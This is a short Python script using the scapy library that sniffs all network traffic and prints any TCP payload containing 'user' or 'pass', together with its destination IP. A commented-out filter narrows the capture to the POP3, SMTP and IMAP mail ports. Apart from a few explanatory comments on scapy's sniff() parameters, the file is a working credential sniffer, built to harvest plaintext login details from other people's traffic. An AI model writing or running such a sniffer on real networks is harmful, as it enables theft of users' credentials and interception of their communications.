# scapy needs root privelege for raw sockets, thus run with sudo

from scapy.all import *


def callback(packet):
    print(packet.show())
    print("-----------------")
    print(packet[TCP].payload)

# sniff(filter="", iface="", prn=function, count=N)
# filter: filter to the packets that scapy sniffs
# iface: the network interface on which to sniff
# prn: function callback for a matching packet
# count: frequency


 #sniff(prn=callback, count = 2)  # the first two are left blank so no filter 
                                # means sniff all packets and no iface means on all interfaces


def extract_info(packet):

    try:
        if(packet[TCP].payload):

            mail_packet = str(packet[TCP].payload)

            if("user" in mail_packet.lower() or "pass" in mail_packet.lower()):
                print(mail_packet)
                print(packet[IP].dst)
                print(packet[TCP].payload)
    except Exception as e:
        print(str(e))


# sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=extract_info, store=0)
sniff(filter="", prn=extract_info, store=0)